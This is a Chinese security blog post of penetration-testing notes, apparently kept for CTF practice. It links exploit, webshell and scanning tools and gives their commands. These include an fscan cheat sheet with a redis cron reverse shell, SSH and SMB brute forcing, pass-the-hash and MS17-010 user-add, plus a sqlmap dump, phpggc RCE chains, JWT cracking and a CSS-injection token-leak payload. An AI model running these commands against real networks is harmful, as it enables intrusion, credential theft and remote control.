---
title: tools
date: 2023-08-05 10:56:10
categories:
- 网络安全
tags:
- web 
- tools
description: |
    一些小工具
---

### 工具

#### 字典

- [爆破字典](https://github.com/rootphantomer/Blasting_dictionary) - 用于爆破的字典
- [fuzzDicts](https://github.com/TheKingOfDuck/fuzzDicts) - 用于Web渗透测试的模糊测试字典
- [弱口令密码字典](https://github.com/k8gege/PasswordDic) - 包含常见弱口令密码的字典
- [Fuzz_dic](https://github.com/7hang/Fuzz_dic) - 参数 | 字典集合

#### 反汇编工具

- [ApplicationScanner](https://github.com/paradiseduo/ApplicationScanner) - 开源的应用程序扫描工具
- [apkscanner](https://github.com/gremwell/apkscanner) - 面向大众的Android应用渗透测试工具
- [ghidra](https://github.com/NationalSecurityAgency/ghidra) - Ghidra是一个软件逆向工程（SRE）框架
- [ghidra_scripts](https://github.com/ghidraninja/ghidra_scripts) - 用于Ghidra软件逆向工程套件的脚本
- [LibcOffset](https://github.com/Coldwave96/LibcOffset) - main_arena_offset查询工具
- [retdec](https://github.com/avast/retdec) - RetDec是一个基于LLVM的可重定向机器码反编译器

#### 漏洞利用

- [oracleShell](https://github.com/jas502n/oracleShell) - oracle 数据库命令执行
- [SharpDecryptPwd](https://github.com/uknowsec/SharpDecryptPwd) - 对保存在Windwos系统上的部分程序的密码进行解析，包括：Navicat,TeamViewer,FileZilla,WinSCP,Xmangager系列产品（Xshell,Xftp)
- [shiro_attack](https://github.com/j1anFen/shiro_attack) - shiro反序列化漏洞综合利用,包含（回显执行命令/注入内存马)
- [ShiroExploit-Deprecated](https://github.com/feihong-cs/ShiroExploit-Deprecated) - Shiro550/Shiro721 一键化利用工具，支持多种回显方式
- [ShiroScan](https://github.com/sv3nbeast/ShiroScan) - Shiro<=1.2.4反序列化，一键检测工具
- [ShiroScan](https://github.com/fupinglee/ShiroScan) - Shiro RememberMe 1.2.4反序列化漏洞图形化检测工具 (Shiro-550)
- [Shiroexploit](https://github.com/tangxiaofeng7/Shiroexploit) - Shiro命令执行工具
- [Struts2-Scan](https://github.com/HatBoy/Struts2-Scan) - Struts2全漏洞扫描利用工具
- [Struts2VulsTools](https://github.com/shack2/Struts2VulsTools) - Struts2系列漏洞检查工具
- [TPscan](https://github.com/Lucifer1993/TPscan) - 一键ThinkPHP漏洞检测
- [ThinkphpRCE](https://github.com/sukabuliet/ThinkphpRCE) - Thinkphp rce扫描脚本，附带日志扫描
- [WeblogicScan](https://github.com/rabbitmask/WeblogicScan) - Weblogic一键漏洞检测工具
- [weblogicScanner](https://github.com/0xn0ne/weblogicScanner) - weblogic漏洞扫描工具

#### 信息收集

- [ds_store_exp](https://github.com/lijiejie/ds_store_exp) - 一个 `.DS_Store` 文件泄露漏洞利用工具。它解析 `.DS_Store` 文件并递归下载文件
- [GitHack](https://github.com/lijiejie/GitHack) -  一个 `.git` 文件夹泄露漏洞利用工具
- [GSIL](https://github.com/FeeiCN/GSIL) - GitHub敏感信息泄漏
- [idea_exploit](https://github.com/lijiejie/idea_exploit) - 收集敏感信息从(.idea)文件夹，用于渗透测试人员
- [OneForAll](https://github.com/shmiley1/OneForAll) - 一款功能强大的子域名收集工具

#### 扫描工具

- [dirmap](https://github.com/H4ckForJob/dirmap)- 一款高级的网站目录和文件扫描工具，比DirBuster、- Dirsearch、cansina和Yu Jian更强大
- [dirsearch](https://github.com/maurosoria/dirsearch)- Web路径扫描工具
- [EHole](https://github.com/EdgeSecurityTeam/EHole)- EHole(棱洞)2.0 重构版-红队重点攻击系统指纹探测工具
- [fscan](https://github.com/shadow1ng/fscan)- 一款内网综合扫描工具，能进行一键自动化、全方位漏洞扫描
- [FuzzScanner](https://github.com/TideSec/FuzzScanner)- 一个主要用于信息搜集的工具集，主要用于对网站子域名、开放端口、端口指纹、c段地址、敏感目录等信息进行批量搜集
- [Glass](https://github.com/s7ckTeam/Glass)- Glass是一款针对资产列表的快速指纹识别工具，通过调用Fofa/ZoomEye/Shodan/360等api接口快速查询资产信息并识别重点资产的指纹，也可针对IP/IP段或资产列表进行快速的指纹识别
- [Medusa](https://github.com/Ascotbe/Medusa)- Medusa是一个红队武器库平台，目前包括扫描功能、XSS平台、协同平台、CVE监控、免杀生成、DNSLOG等功能，持续开发中
- [NoXss](https://github.com/lwzSoviet/NoXss)- 更快的XSS扫描器，支持反射XSS和DOM-XSS
- [Packer-Fuzzer](https://github.com/rtcatc/Packer-Fuzzer)- Packer Fuzzer是一种快速高效的安全检测工具，用于检测由JavaScript模块打包器（如Webpack）构建的网站
- [vulmap](https://github.com/zhzyker/vulmap)- Vulmap是一款web漏洞扫描和验证工具，可以对web应用程序进行漏洞扫描，并具有漏洞验证功能
- [wafw00f](https://github.com/EnableSecurity/wafw00f)- WAFW00F允许用户识别和指纹识别保护网站的Web应用程序防火墙（WAF）产品
- [WebAliveScan](https://github.com/broken5/WebAliveScan)- 对目标域名进行快速的存活扫描、简单的指纹识别、目录扫描
- [xray](https://github.com/chaitin/xray)- 一款完善的安全评估工具，支持常见web安全问题扫描和自定义poc。使用之前务必先阅读文档
- [Mobile-Security-Framework-MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF)- Mobile Security Framework (MobSF)是一个自动的，一体化的移动应用程序（Android/iOS/Windows）渗透测试、恶意软件分析和安全评估框架，能够进行静态和动态分析

#### webshell

- [antSword](https://github.com/AntSwordProject/antSword)- AntSword是一个跨平台的网站管理工具包
- [Behinder](https://github.com/rebeyond/Behinder)- “冰蝎”动态二进制加密网站管理客户端
- [Godzilla](https://github.com/BeichenDream/Godzilla)
- [frp](https://github.com/fatedier/frp)- 一个快速的反向代理，帮助您将位于NAT或防火墙后的本地服务器暴露到互联网
- [reGeorg](https://github.com/sensepost/reGeorg) - reDuh的继任者，攻破堡垒web服务器并通过非军事区创建SOCKS代理
- [Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg)- Neo-reGeorg是一个旨在大幅重构reGeorg的项目
- [pystinger](https://github.com/FunnyWolf/pystinger) - 使用webshell绕过防火墙进行流量转发
- [webshell](https://github.com/tennc/webshell)- 这是一个webshell开源项目
- [WebShell-AIHunter](https://github.com/Coldwave96/WebShell-AIHunter) - 机器学习NB算法实现基于文本的WebShell检测工具

#### code

- [JQF](https://github.com/rohanpadhye/JQF)- Java的覆盖引导语义模糊测试
- [junit-quickcheck](https://github.com/pholser/junit-quickcheck) - 基于属性的测试，JUnit风格

#### 其他

- [HackINonE](https://github.com/Coldwave96/HackINonE) - 打造个人定制版Hacker工具集
- [PocLibrary](https://github.com/Coldwave96/PocLibrary) - 定制界面版POC/EXP脚本仓库
- [MaliciousURLs](https://github.com/Coldwave96/MaliciousURLs)  - 定制界面版POC/EXP脚本仓库
- [TcpRst](https://github.com/Coldwave96/TcpRst) - 基于RAW_SOCKET+TCP Reset包实现的TCP旁路阻断
- [Pentest_Note](https://github.com/xiaoy-sec/Pentest_Note)- 渗透测试常规操作记录
- [Vulnerability](https://forum.ywhack.com/forum-59-1.html) - 此项目将不定期从棱角社区对外进行公布一些最新漏洞
- [SD-Perimeter](https://github.com/zenny/SD-Perimeter) - 使用现有的开源组件实现的软件定义边界

### 介绍一些工具的使用

#### jwt

- hashcat
  `hashcat -a 0 -m 16500 xxx jwt.secrets.list`

- jwt_tool

- jwt-cracker

  `./jwtcrack xxx`

- flask-session-cookie

  `python flask_session_cookie_manager3.py decode -c "session值" -s "key值"`
  `python flask_session_cookie_manager3.py encode -s "key值" -t "我们需要伪造的值"`

### sql

- sqlmap

  `sqlmap -u http://b33260ff-e59f-43b3-a76a-b0abe8dbf074.challenge.ctf.show/api/index.php  --method=PUT --headers="Content-Type: text/plain" --data="id=1" --refer=ctf.show  -D ctfshow_web -T ctfshow_flavis -C ctfshow_flagxsa --dump --safe-url http://b33260ff-e59f-43b3-a76a-b0abe8dbf074.challenge.ctf.show/api/getToken.php --safe-freq 1 --tamper="revbaserev.py "`

### ssti

- fenjing

  `python3 -m fenjing crack -u "xxx" -i exgr  --tamper-cmd 'rev'`

  `python3 -m fenjing webui`

  还有一个py脚本在vscode里

### gopher

#### Gopherus

`docker exec -it charming_kilby /bin/bash`

| gopherus --exploit | Arguments can be :    |
| ------------------ | --------------------- |
|                    | --exploit mysql       |
|                    | --exploit postgresql  |
|                    | --exploit fastcgi     |
|                    | --exploit redis       |
|                    | --exploit zabbix      |
|                    | --exploit pymemcache  |
|                    | --exploit rbmemcache  |
|                    | --exploit phpmemcache |
|                    | --exploit dmpmemcache |
|                    | --exploit smtp        |

eg:`python gopherus.py --exploit fastcgi`

### 目录扫描

- dirmap

  `python dirmap.py -i xxx -lcf`

- dirsearch

  `python dirsearch.py -u xxx`

### php

#### phpggc 框架漏洞

- 运行`./phpggc -l`以获取小工具链列表
- `-i`获取有关链的详细信息
- 对于 RCE 小工具，执行的命令可以有 3 种格式类型，具体取决于小工具的工作方式：
  - 远程命令执行（命令）：`./phpggc Symfony/RCE1 id`
  - RCE（PHP 代码）：`./phpggc Symfony/RCE2 'phpinfo();'`
  - RCE（函数调用）：`./phpggc Symfony/RCE4 system id`
- `--wrapper`( )选项`-w`允许您定义包含以下函数的 PHP 文件：
  - `process_parameters(array $parameters)`**：之前** 调用`generate()`，允许更改参数
  - `process_object(object $object)`**：在之前** 调用`serialize()`，允许更改对象
  - `process_serialized(string $serialized)`：**在 后** `serialize()`立即调用，允许更改序列化字符串

#### iconv

`python php_filter_chain_generator.py --chain '<?php phpinfo(); ?>  '`

### pickle反序列化

#### pker

还没学到,再说

### 内网

#### fscan

```bash
fscan.exe -h 192.168.1.1/24  (默认使用全部模块)
fscan.exe -h 192.168.1.1/16  (B段扫描)
```

其他用法

```bash
fscan.exe -h 192.168.1.1/24 -np -no -nopoc(跳过存活检测 、不保存文件、跳过web poc扫描)
fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (redis 写公钥)
fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)
fscan.exe -h 192.168.1.1/24 -c whoami (ssh 爆破成功后，命令执行)
fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 (指定模块ssh和端口)
fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt (加载指定文件的用户名、密码来进行爆破)
fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt (指定扫描结果保存路径,默认保存在当前路径) 
fscan.exe -h 192.168.1.1/8  (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息 )
fscan.exe -h 192.168.1.1/24 -m smb -pwd password (smb密码碰撞)
fscan.exe -h 192.168.1.1/24 -m ms17010 (指定模块)
fscan.exe -hf ip.txt  (以文件导入)
fscan.exe -u http://baidu.com -proxy 8080 (扫描单个url,并设置http代理 http://127.0.0.1:8080)
fscan.exe -h 192.168.1.1/24 -nobr -nopoc (不进行爆破,不扫Web poc,以减少流量)
fscan.exe -h 192.168.1.1/24 -pa 3389 (在原基础上,加入3389->rdp扫描)
fscan.exe -h 192.168.1.1/24 -socks5 127.0.0.1:1080 (只支持简单tcp功能的代理,部分功能的库不支持设置代理)
fscan.exe -h 192.168.1.1/24 -m ms17010 -sc add (内置添加用户等功能,只适用于备选工具,更推荐其他ms17010的专项利用工具)
fscan.exe -h 192.168.1.1/24 -m smb2 -user admin -hash xxxxx (pth hash碰撞,xxxx:ntlmhash,如32ed87bdb5fdc5e9cba88547376818d4)
fscan.exe -h 192.168.1.1/24 -m wmiexec -user admin -pwd password -c xxxxx (wmiexec无回显命令执行)
```

完整参数

```bash
  -c string
        ssh命令执行
  -cookie string
        设置cookie
  -debug int
        多久没响应,就打印当前进度(default 60)
  -domain string
        smb爆破模块时,设置域名
  -h string
        目标ip: 192.168.11.11 | 192.168.11.11-255 | 192.168.11.11,192.168.11.12
  -hf string
        读取文件中的目标
  -hn string
        扫描时,要跳过的ip: -hn 192.168.1.1/24
  -m string
        设置扫描模式: -m ssh (default "all")
  -no
        扫描结果不保存到文件中
  -nobr
        跳过sql、ftp、ssh等的密码爆破
  -nopoc
        跳过web poc扫描
  -np
        跳过存活探测
  -num int
        web poc 发包速率  (default 20)
  -o string
        扫描结果保存到哪 (default "result.txt")
  -p string
        设置扫描的端口: 22 | 1-65535 | 22,80,3306 (default "21,22,80,81,135,139,443,445,1433,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017")
  -pa string
        新增需要扫描的端口,-pa 3389 (会在原有端口列表基础上,新增该端口)
  -path string
        fcgi、smb romote file path
  -ping
        使用ping代替icmp进行存活探测
  -pn string
        扫描时要跳过的端口,as: -pn 445
  -pocname string
        指定web poc的模糊名字, -pocname weblogic
  -proxy string
        设置代理, -proxy http://127.0.0.1:8080
  -user string
        指定爆破时的用户名
  -userf string
        指定爆破时的用户名文件
  -pwd string
        指定爆破时的密码
  -pwdf string
        指定爆破时的密码文件
  -rf string
        指定redis写公钥用模块的文件 (as: -rf id_rsa.pub)
  -rs string
        redis计划任务反弹shell的ip端口 (as: -rs 192.168.1.1:6666)
  -silent
        静默扫描,适合cs扫描时不回显
  -sshkey string
        ssh连接时,指定ssh私钥
  -t int
        扫描线程 (default 600)
  -time int
        端口扫描超时时间 (default 3)
  -u string
        指定Url扫描
  -uf string
        指定Url文件扫描
  -wt int
        web访问超时时间 (default 5)
  -pocpath string
        指定poc路径
  -usera string
        在原有用户字典基础上,新增新用户
  -pwda string
        在原有密码字典基础上,增加新密码
  -socks5
        指定socks5代理 (as: -socks5  socks5://127.0.0.1:1080)
  -sc 
        指定ms17010利用模块shellcode,内置添加用户等功能 (as: -sc add)
```

### curl

```bash
1.不带有任何参数时，curl 就是发出 GET 请求。
curl https://www.example.com
上面命令向www.example.com发出 GET 请求，服务器返回的内容会在命令行输出。

2.-A
-A参数指定客户端的用户代理标头，即User-Agent。curl 的默认用户代理字符串是curl/[version]。

curl -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36' https://google.com
上面命令将User-Agent改成 Chrome 浏览器。

curl -A '' https://google.com
上面命令会移除User-Agent标头。

3.也可以通过-H参数直接指定标头，更改User-Agent。
curl -H 'User-Agent: php/1.0' https://google.com

4.-b
-b参数用来向服务器发送 Cookie。
curl -b 'foo=bar' https://google.com
上面命令会生成一个标头Cookie: foo=bar，向服务器发送一个名为foo、值为bar的 Cookie。

curl -b 'foo1=bar;foo2=bar2' https://google.com
上面命令发送两个 Cookie。

curl -b cookies.txt https://www.google.com
上面命令读取本地文件cookies.txt，里面是服务器设置的 Cookie（参见-c参数），将其发送到服务器。

5.-c
-c参数将服务器设置的 Cookie 写入一个文件。

curl -c cookies.txt https://www.google.com
上面命令将服务器的 HTTP 回应所设置 Cookie 写入文本文件cookies.txt。

6.-d
-d参数用于发送 POST 请求的数据体。

curl -d'login=emma＆password=123'-X POST https://google.com/login
# 或者
curl -d 'login=emma' -d 'password=123' -X POST  https://google.com/login
使用-d参数以后，HTTP 请求会自动加上标头Content-Type : application/x-www-form-urlencoded。并且会自动将请求转为 POST 方法，因此可以省略-X POST。

-d参数可以读取本地文本文件的数据，向服务器发送。

curl -d '@data.txt' https://google.com/login
上面命令读取data.txt文件的内容，作为数据体向服务器发送。

7.--data-urlencode
--data-urlencode参数等同于-d，发送 POST 请求的数据体，区别在于会自动将发送的数据进行 URL 编码。

curl --data-urlencode 'comment=hello world' https://google.com/login
上面代码中，发送的数据hello world之间有一个空格，需要进行 URL 编码。

9.-e
-e参数用来设置 HTTP 的标头Referer，表示请求的来源。

curl -e 'https://google.com?q=example' https://www.example.com
上面命令将Referer标头设为https://google.com?q=example。

10.-H参数可以通过直接添加标头Referer，达到同样效果。

curl -H 'Referer: https://google.com?q=example' https://www.example.com

11.-F
-F参数用来向服务器上传二进制文件。

curl -F 'file=@photo.png' https://google.com/profile
上面命令会给 HTTP 请求加上标头Content-Type: multipart/form-data，然后将文件photo.png作为file字段上传。

-F参数可以指定 MIME 类型。

curl -F 'file=@photo.png;type=image/png' https://google.com/profile
上面命令指定 MIME 类型为image/png，否则 curl 会把 MIME 类型设为application/octet-stream。

-F参数也可以指定文件名。

curl -F 'file=@photo.png;filename=me.png' https://google.com/profile
上面命令中，原始文件名为photo.png，但是服务器接收到的文件名为me.png。

12.-G
-G参数用来构造 URL 的查询字符串。

curl -G -d 'q=kitties' -d 'count=20' https://google.com/search
上面命令会发出一个 GET 请求，实际请求的 URL 为https://google.com/search?q=kitties&count=20。如果省略--G，会发出一个 POST 请求。

如果数据需要 URL 编码，可以结合--data--urlencode参数。

curl -G --data-urlencode 'comment=hello world' https://www.example.com

13.-H
-H参数添加 HTTP 请求的标头。

curl -H 'Accept-Language: en-US' https://google.com
上面命令添加 HTTP 标头Accept-Language: en-US。

curl -H 'Accept-Language: en-US' -H 'Secret-Message: xyzzy' https://google.com
上面命令添加两个 HTTP 标头。


14.-d

curl -d '{"login": "emma", "pass": "123"}' -H 'Content-Type: application/json' https://google.com/login
上面命令添加 HTTP 请求的标头是Content-Type: application/json，然后用-d参数发送 JSON 数据。

15.-i
-i参数打印出服务器回应的 HTTP 标头。

curl -i https://www.example.com
上面命令收到服务器回应后，先输出服务器回应的标头，然后空一行，再输出网页的源码。

16.-I
-I参数向服务器发出 HEAD 请求，然会将服务器返回的 HTTP 标头打印出来。


curl -I https://www.example.com
上面命令输出服务器对 HEAD 请求的回应。

--head参数等同于-I。

curl --head https://www.example.com

17.-k
-k参数指定跳过 SSL 检测。

curl -k https://www.example.com
上面命令不会检查服务器的 SSL 证书是否正确。

18.-L
-L参数会让 HTTP 请求跟随服务器的重定向。curl 默认不跟随重定向。

curl -L -d 'tweet=hi' https://api.twitter.com/tweet
--limit-rate
--limit-rate用来限制 HTTP 请求和回应的带宽，模拟慢网速的环境。

19.curl --limit-rate 200k https://google.com
上面命令将带宽限制在每秒 200K 字节。

20.-o
-o参数将服务器的回应保存成文件，等同于wget命令。

curl -o example.html https://www.example.com
上面命令将www.example.com保存成example.html。

21.-O
-O参数将服务器回应保存成文件，并将 URL 的最后部分当作文件名。

curl -O https://www.example.com/foo/bar.html
上面命令将服务器回应保存成文件，文件名为bar.html。

22.-s
-s参数将不输出错误和进度信息。

curl -s https://www.example.com
上面命令一旦发生错误，不会显示错误信息。不发生错误的话，会正常显示运行结果。

如果想让 curl 不产生任何输出，可以使用下面的命令。

curl -s -o /dev/null https://google.com

23.-S
-S参数指定只输出错误信息，通常与-s一起使用。

curl -s -o /dev/null https://google.com
上面命令没有任何输出，除非发生错误。

24-u
-u参数用来设置服务器认证的用户名和密码。

curl -u 'bob:12345' https://google.com/login
上面命令设置用户名为bob，密码为12345，然后将其转为 HTTP 标头Authorization: Basic Ym9iOjEyMzQ1。

curl 能够识别 URL 里面的用户名和密码。

curl https://bob:12345@google.com/login
上面命令能够识别 URL 里面的用户名和密码，将其转为上个例子里面的 HTTP 标头。

curl -u 'bob' https://google.com/login
上面命令只设置了用户名，执行后，curl 会提示用户输入密码。

25.-v
-v参数输出通信的整个过程，用于调试。

curl -v https://www.example.com
--trace参数也可以用于调试，还会输出原始的二进制数据。

curl --trace - https://www.example.com

26.-x
-x参数指定 HTTP 请求的代理。

curl -x socks5://james:cats@myproxy.com:8080 https://www.example.com
上面命令指定 HTTP 请求通过myproxy.com:8080的 socks5 代理发出。

如果没有指定代理协议，默认为 HTTP。

curl -x james:cats@myproxy.com:8080 https://www.example.com
上面命令中，请求的代理使用 HTTP 协议。

27.-X
-X参数指定 HTTP 请求的方法。

curl -X POST https://www.example.com
上面命令对https://www.example.com发出 POST 请求。
```

### hashpump

哈希长度拓展攻击

```php
<?php
  @error_reporting(0);

$flag = "flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxx}";
$secret_key = "xxxxxxxxxxxxxxxx"; // the key is safe! no one can know except me

$username = $_POST["username"];
$password = $_POST["password"];
header("hash_key:" . $hash_key);

if (!empty($_COOKIE["getflag"])) {
    if (urldecode($username) === "D0g3" && urldecode($password) != "D0g3") {
        if ($COOKIE["getflag"] === md5($secret_key . urldecode($username . $password))) {
            echo "Great! You're in!\n";
            die ("<!-- The flag is ". $flag . "-->");
        }
        else {
            die ("Go out! Hacker!");
        }
    }
    else {
        die ("LEAVE! You're not one of us!");
    }
}

setcookie("sample-hash", md5($secret_key . urldecode("D0g3" . "D0g3")), time() + (60 * 60 * 24 * 7));

if (empty($_COOKIE["source"])) {
    setcookie("source", 0, time() + (60 * 60 * 24 * 7));
}
```

有一个要注意的点

python提交数据的时候

```py
data={"username":'D0g3',"password":b"D0g3\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90\x00\x00\x00\x00\x00\x00\x00abc"}
```

要用字节符上传防止转义

### sic

标准用法:`./sic -p 3000 --ph "http://localhost:3000" --ch "http://localhost:3001" -t my_template_file`

有效负载:`<style>@import url(http://localhost:3000/staging?len=32);</style>`

示例模版:`input[name=csrf][value^={{:token:}}] { background: url({{:callback:}}); }`

没用成功
